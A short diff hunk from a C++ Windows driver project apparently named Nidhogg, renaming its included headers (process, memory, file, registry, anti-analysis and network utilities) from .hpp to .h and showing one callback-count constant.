@@ -2,18 +2,18 @@
 #include "pch.h"
 
 extern "C" {
-	#include "WindowsTypes.hpp"
+	#include "WindowsTypes.h"
 }
 #include "NidhoggCommon.h"
-#include "ProcessUtils.hpp"
-#include "MemoryUtils.hpp"
-#include "FileUtils.hpp"
-#include "RegistryUtils.hpp"
-#include "AntiAnalysis.hpp"
-#include "NetworkUtils.hpp"
+#include "ProcessUtils.h"
+#include "MemoryUtils.h"
+#include "FileUtils.h"
+#include "RegistryUtils.h"
+#include "AntiAnalysis.h"
+#include "NetworkUtils.h"
 #include "ScriptManager.h"
-#include "NidhoggDeviceControl.hpp"
-#include "InitialOperation.hpp"
+#include "NidhoggDeviceControl.h"
+#include "InitialOperation.h"
 
 // Definitions.
 constexpr SIZE_T REGISTERED_OB_CALLBACKS = 2;
